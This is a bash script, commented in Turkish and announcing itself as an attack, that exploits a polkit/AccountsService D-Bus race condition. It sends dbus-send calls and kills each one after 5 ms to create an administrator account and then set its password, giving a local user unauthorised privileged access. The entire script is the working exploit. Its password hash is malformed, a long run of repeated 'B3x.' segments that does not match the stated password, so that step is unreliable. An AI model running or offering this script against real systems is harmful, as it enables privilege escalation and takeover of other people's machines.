#!/bin/bash

# Kullanıcı oluşturma aşaması
echo "Saldiri baslatiliyor..."
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:borjagaleren string:"Borja Galeren" int32:1 & sleep 0.005s; kill $!

# Şifre belirleme aşaması (Şifre: 12345)
sleep 0.5
id_u=$(id -u borjagaleren)
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$id_u org.freedesktop.Accounts.User.SetPassword string:'$6$jOQJ5USX$c2.7Y.y/B3m.B3x.B3x.B3x.B3x.B3x.B3x.B3x.B3x.B3x.B3x.B3x.B3x.B3x.B3x.B3x' string:'' & sleep 0.005s; kill $!

echo "Kullanici olusturuldu mu kontrol ediliyor..."
id borjagaleren
